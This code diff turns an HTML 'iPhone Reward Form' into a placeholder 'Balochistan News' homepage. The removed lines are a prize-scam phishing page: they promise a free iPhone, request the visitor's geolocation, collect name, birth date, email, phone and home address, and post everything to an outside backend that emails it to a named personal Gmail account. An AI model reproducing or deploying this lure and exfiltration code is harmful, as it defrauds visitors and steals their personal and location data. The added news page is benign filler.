@@ -3,24 +3,230 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>iPhone Reward Form</title>
+    <title>Balochistan News - Breaking News and Stories</title>
     <!-- Bootstrap CSS -->
     <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
     <style>
-        /* Your existing styling */
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f8f9fa;
+            color: #333;
+        }
+
+        /* Navbar */
+        .navbar {
+            background-color: #002147;
+        }
+
+        .navbar-brand {
+            font-weight: bold;
+            font-size: 1.8em;
+            color: white !important;
+        }
+
+        .navbar-nav .nav-link {
+            color: white !important;
+        }
+
+        /* Header Section */
+        .hero-section {
+            background-image: url('https://via.placeholder.com/1600x500?text=Balochistan+News'); /* Replace with a real image */
+            background-size: cover;
+            background-position: center;
+            color: white;
+            text-align: center;
+            padding: 80px 20px;
+        }
+
+        .hero-section h1 {
+            font-size: 3em;
+            font-weight: bold;
+        }
+
+        .hero-section p {
+            font-size: 1.2em;
+        }
+
+        /* News Articles Section */
+        .news-article {
+            border-bottom: 2px solid #ddd;
+            padding: 20px;
+            margin-bottom: 20px;
+            transition: all 0.3s ease;
+        }
+
+        .news-article:hover {
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .news-article img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+        }
+
+        .news-article h2 {
+            font-size: 1.8em;
+            color: #002147;
+            margin-top: 15px;
+        }
+
+        .news-article p {
+            font-size: 1.1em;
+            color: #666;
+        }
+
+        /* Footer */
+        .footer {
+            background-color: #002147;
+            color: white;
+            padding: 20px 0;
+            text-align: center;
+        }
+
+        .footer a {
+            color: white;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Sidebar Section */
+        .sidebar {
+            background-color: #fff;
+            padding: 20px;
+            margin-bottom: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .sidebar h3 {
+            font-size: 1.5em;
+            color: #002147;
+        }
+
+        .sidebar ul {
+            list-style: none;
+            padding: 0;
+        }
+
+        .sidebar ul li {
+            margin-bottom: 10px;
+        }
+
+        .sidebar ul li a {
+            color: #333;
+            text-decoration: none;
+        }
+
+        .sidebar ul li a:hover {
+            text-decoration: underline;
+        }
+
+        /* Media Query for Responsive Layout */
+        @media (max-width: 768px) {
+            .hero-section {
+                padding: 50px 10px;
+            }
+
+            .hero-section h1 {
+                font-size: 2em;
+            }
+
+            .hero-section p {
+                font-size: 1em;
+            }
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1 class="form-heading">Congratulations! 🎉</h1>
-        <p class="lead">You've been selected to receive a brand-new iPhone!</p>
-        <p class="form-text">Please fill out the form below to claim your reward.</p>
 
-        <form id="rewardForm">
-            <!-- Your form fields here -->
-            <p id="locationDisplay" class="form-text">Location permissions required to auto-fill your location.</p>
-            <button type="submit" class="btn btn-primary btn-block">Submit and Claim iPhone</button>
-        </form>
+    <!-- Navigation Bar -->
+    <nav class="navbar navbar-expand-lg">
+        <a class="navbar-brand" href="#">Balochistan News</a>
+        <div class="collapse navbar-collapse">
+            <ul class="navbar-nav ml-auto">
+                <li class="nav-item">
+                    <a class="nav-link" href="#">Home</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="#">Politics</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="#">Society</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="#">Culture</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="#">Contact</a>
+                </li>
+            </ul>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="hero-section">
+        <h1>Welcome to Balochistan News</h1>
+        <p>Your trusted source for the latest news and stories from Balochistan and beyond.</p>
+    </section>
+
+    <!-- Main Content Section -->
+    <div class="container">
+        <div class="row">
+            <!-- News Articles Column -->
+            <div class="col-md-8">
+                <div class="news-article">
+                    <img src="https://via.placeholder.com/800x400?text=News+Image" alt="News">
+                    <h2>Breaking News: Balochistan Witnesses Historic Event</h2>
+                    <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer nec odio. Praesent libero. Sed cursus ante dapibus diam.</p>
+                    <a href="#" class="btn btn-link">Read More</a>
+                </div>
+
+                <div class="news-article">
+                    <img src="https://via.placeholder.com/800x400?text=News+Image" alt="News">
+                    <h2>Local Communities Push for Economic Development</h2>
+                    <p>Vestibulum auctor dapibus neque. Aenean leo ligula, porttitor eu, consequat vitae, eleifend ac, enim. Aliquam erat volutpat.</p>
+                    <a href="#" class="btn btn-link">Read More</a>
+                </div>
+
+                <div class="news-article">
+                    <img src="https://via.placeholder.com/800x400?text=News+Image" alt="News">
+                    <h2>Balochistan’s Cultural Heritage Preserved in New Exhibition</h2>
+                    <p>Ut fringilla. Fusce fermentum. Curabitur nisi est, placerat nec suscipit vel, aliquet id purus. In at nisl et urna sollicitudin laoreet.</p>
+                    <a href="#" class="btn btn-link">Read More</a>
+                </div>
+            </div>
+
+            <!-- Sidebar Column -->
+            <div class="col-md-4">
+                <div class="sidebar">
+                    <h3>Popular Articles</h3>
+                    <ul>
+                        <li><a href="#">Balochistan’s Economy: Challenges and Solutions</a></li>
+                        <li><a href="#">History of Balochistan: A Glimpse into the Past</a></li>
+                        <li><a href="#">Balochistan's Role in National Politics</a></li>
+                        <li><a href="#">Interview with Local Leaders on Regional Development</a></li>
+                    </ul>
+                </div>
+
+                <div class="sidebar">
+                    <h3>Upcoming Events</h3>
+                    <ul>
+                        <li><a href="#">Balochistan Cultural Festival</a></li>
+                        <li><a href="#">Political Debates in Quetta</a></li>
+                        <li><a href="#">Environmental Awareness Campaign</a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        <p>&copy; 2024 Balochistan News | <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a></p>
     </div>
 
     <!-- Bootstrap and jQuery JS -->
@@ -28,81 +234,5 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js" async></script>
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" async></script>
 
-    <!-- JavaScript for Geolocation and Email Sending -->
-    <script>
-        let latitude, longitude;
-
-        // Geolocation function triggered only on form submission
-        function requestLocation() {
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        latitude = position.coords.latitude;
-                        longitude = position.coords.longitude;
-                        document.getElementById("locationDisplay").textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
-                    },
-                    (error) => {
-                        document.getElementById("locationDisplay").textContent = "Location error occurred.";
-                    }
-                );
-            } else {
-                document.getElementById("locationDisplay").textContent = "Geolocation is not supported by this browser.";
-            }
-        }
-
-        // Form submission
-        document.getElementById("rewardForm").addEventListener("submit", function (e) {
-            e.preventDefault();
-
-            // Request location before submitting the form
-            requestLocation();
-
-            const formData = {
-                fullName: document.getElementById("fullName").value,
-                dob: document.getElementById("dob").value,
-                email: document.getElementById("email").value,
-                phoneNumber: document.getElementById("phoneNumber").value,
-                address: document.getElementById("address").value,
-                city: document.getElementById("city").value,
-                postalCode: document.getElementById("postalCode").value,
-                location: `Latitude: ${latitude}, Longitude: ${longitude}`
-            };
-
-            const message = `
-                Name: ${formData.fullName}
-                Date of Birth: ${formData.dob}
-                Email: ${formData.email}
-                Phone Number: ${formData.phoneNumber}
-                Address: ${formData.address}
-                City: ${formData.city}
-                Postal Code: ${formData.postalCode}
-                Location: ${formData.location}
-            `;
-
-            sendEmail("Form Submission Data", message, "khalilrodeni@gmail.com");
-            alert("Thank you for your submission! We will contact you shortly.");
-        });
-
-        // Email Sending Function
-        function sendEmail(subject, message, recipientEmail) {
-            const emailData = {
-                subject: subject,
-                message: message,
-                recipient_email: recipientEmail,
-                recipient_name: "Khalil Ahmed"
-            };
-
-            fetch("https://zalex-backend.onrender.com/api/send-email/", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                },
-                body: JSON.stringify(emailData)
-            })
-            .then(response => response.ok ? response.json() : Promise.reject(`Error ${response.status}`))
-            .then(data => alert(data.message ? "Email sent successfully!" : `Error: ${data.error}`))
-            .catch(error => alert("Error sending email: " + error));
-        }
-    </script>
 </body>
 </html>
